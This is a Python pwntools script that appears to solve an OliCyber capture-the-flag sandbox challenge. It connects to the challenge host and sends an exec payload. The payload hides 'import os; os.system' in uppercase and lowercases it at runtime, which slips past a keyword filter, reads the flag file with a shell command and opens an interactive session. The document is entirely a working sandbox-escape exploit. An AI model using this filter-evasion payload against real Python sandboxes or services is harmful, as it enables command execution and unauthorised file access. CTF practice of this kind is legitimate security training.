from pwn import *

r = remote("sandbox_v1.challs.olicyber.it", 35003)

payload = "exec(\"IMPORT OS; OS.SYSTEM('cat FLAG')\".lower())"
r.sendlineafter(b">>> ", payload.encode())

r.interactive()